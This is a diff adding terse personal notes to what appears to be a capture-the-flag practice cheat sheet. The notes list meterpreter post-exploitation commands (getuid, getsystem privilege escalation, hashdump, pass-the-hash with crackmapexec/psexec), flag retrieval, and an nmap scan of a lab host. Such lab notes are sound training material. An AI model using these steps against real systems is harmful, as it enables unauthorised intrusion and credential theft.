@@ -37,6 +37,23 @@ set options
 set payload
 run
 
+NT AUTHOrity -> highest
+getuid
+sysinfo
+architecture must match meterpreter shell x86
+meterpreter> help
+POST -> arp
+
+getsystem -> escalate privileges -> may crash machine
+hashdump -> crack passwords -> second hash crackmapexec psexec
+
+> shell
+C:\WINDOWS\> cd Documents Settings \  john z Desktop\ type user.txt submit flag
+C:\WINDOWS\> cd Documents Settings \ administrator \ Desktop\type root.txt submit flag
+pwd
+cd c:\\
+dir
+
 nmap -A -T4 -p- -Pn 10.10.10.229
 
 SPECTRA
